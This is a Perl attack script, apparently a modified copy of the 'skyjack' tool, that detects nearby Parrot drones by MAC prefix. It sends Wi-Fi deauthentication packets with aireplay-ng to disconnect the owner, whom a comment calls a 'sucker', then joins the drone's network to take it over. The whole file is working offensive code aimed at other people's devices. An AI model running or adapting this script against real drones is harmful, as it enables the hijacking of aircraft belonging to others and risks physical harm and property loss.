#!/usr/bin/perl

# skyjack, by samy kamkar

# this software detects flying drones, deauthenticates the
# owner of the targetted drone, then takes control of the drone

# by samy kamkar, code@samy.pl
# http://samy.pl
# dec 2, 2013


# mac addresses of ANY type of drone we want to attack
# Parrot owns the 90:03:B7 block of MACs and a few others
# see here: http://standards.ieee.org/develop/regauth/oui/oui.txt
my @drone_macs = qw/90:03:B7 A0:14:3D 00:12:1C 00:26:7E/;
my @whitelist_arr = ();
#my @whitelist_arr = ("C0:EE:FB:4A:18:DF", "90:03:B7:0C:A6:17");


use strict;

my $interface  	= shift || "wlan1";
my $interface1 	= shift || "wlan2";

# the JS to control our drone
my $controljs  	= shift || "drone_control/drone_pwn.js";

# paths to applications
my $dhclient	= "dhclient";
my $iwconfig	= "iwconfig";
my $ifconfig	= "ifconfig";
my $airmon		= "airmon-ng";
my $aireplay	= "aireplay-ng";
my $aircrack	= "aircrack-ng";
my $airodump	= "airodump-ng";
my $nodejs		= "nodejs";

#sudo("service", "network-manager", "stop");
sleep 1;
# put device into monitor mode
sudo($ifconfig, $interface, "down");

#sudo($airmon, "check", "kill");
#sudo($airmon, "start", $interface);

# tmpfile for ap output
my $tmpfile = "~/Desktop/ds";
my %skyjacked;

my $box = 0;
while ($box == 0)
{

		# show user APs
		eval {
			local $SIG{INT} = sub { die };
			my $pid = open(DUMP, "|sudo $airodump --output-format csv -w $tmpfile $interface >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
			print "Running: $airodump on pid $pid\n";

			# wait 5 seconds then kill
			sleep 20;
			print DUMP "\cC";
			sleep 1;
			sudo("kill", $pid);
			sleep 1;
			sudo("kill", "-HUP", $pid);
			sleep 1;
			sudo("kill", "-9", $pid);
			sleep 1;
			sudo("killall", "-9", $aireplay, $airodump);
			#kill(9, $pid);
			close(DUMP);
		};

		sleep 4;
		# read in APs
		my %clients;
		my %chans;
		my $tempBox = 0;
		my $tempWhiteListBox = 0;
		foreach my $tmpfile1 (glob("$tmpfile*.csv"))
		{

				print "\nReading Temp-File: $tmpfile1 \n";

				open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
				while (<APS>)
				{

					# strip weird chars
					s/[\0\r]//g;

					foreach my $dev (@drone_macs)
					{
	
						# determine the channel
						if (/^($dev:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),/)
						{
							print "CHANNEL $1 $2 $3\n";
							$chans{$1} = [$2, $3];
							$tempBox = 1;
						}

						# grab our drone MAC and owner MAC
						if (/^([\w:]+).*\s($dev:[\w:]+),/)
						{
							print "CLIENT $1 $2\n";
							$clients{$1} = $2;
						}
					}
				}
				close(APS);

				if (!$tempBox){
					print "No Drone or Client found.\n";						
				}

				sudo("rm", $tmpfile1);
				#unlink($tmpfile1);
		}

		print "\n";
		sleep 5;

		foreach my $cli (keys %clients)
		{
			print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";

			# $value can be any regex. be safe
			if (grep( /^$clients{$cli}$/, @whitelist_arr )) {
			  $tempWhiteListBox = 1;
			  print "+++++++++ BUT ($clients{$cli}) is a white listed Drone+++++++++\n";
			} elsif (grep( /^$cli$/, @whitelist_arr )) {
			  print "+++++++++ BUT ($cli) is a white listed Client+++++++++\n";
			} else {

				# hop onto the channel of the ap
				print "Jumping onto drone's channel $chans{$clients{$cli}}[0]\n";
				#sudo($airmon, "start", $interfaceMon, $chans{$clients{$cli}}[0]);
				#sudo($iwconfig, $interfaceMon, "channel", $chans{$clients{$cli}}[0]);
				sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);

				sleep(1);

				# now, disconnect the TRUE owner of the drone.
				# sucker.
				print "Disconnecting the true owner of the drone ;)\n\n";
				#sudo($aireplay, "-0", "3", "-a", $clients{$cli}, "-c", $cli, $interfaceMon);
				sudo($aireplay, "-0", "10", "-a", $clients{$cli}, "-c", $cli, $interface);
			}
			
			print "\n";

		}	
		
		# sleep(2);
	  	
		foreach my $drone (keys %chans)
		{
			# ignore drones we've skyjacked before -- thanks to @daviottenheimer for bug discovery!
			next if $skyjacked{$chans{$drone}[1]}++;

			# ignore whitelisted drones
			if ( grep( /^$drone$/, @whitelist_arr ) ) {
			  print "+++++++++Can't connect to a white listed Drone ($drone)+++++++++\n";
			} else {
			
				print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n";
				sudo($iwconfig, $interface1, "essid", $chans{$drone}[1]);

				print "Acquiring IP from drone for hostile takeover\n";
				sudo($dhclient, "-v", $interface1);

				print "\n\nTAKING OVER DRONE\n";
				 
				sudo("iwgetid", "wlan1", "-r");
				#sudo($nodejs, $controljs);

			}
			print "\n";			
		}


	$box++;
	print "Done Done Done $box \n\n";

}

	
sub sudo
{
	print "Running: @_\n";
	system("sudo", @_);
}

sub just_sudo
{
	system("sudo", @_);
}
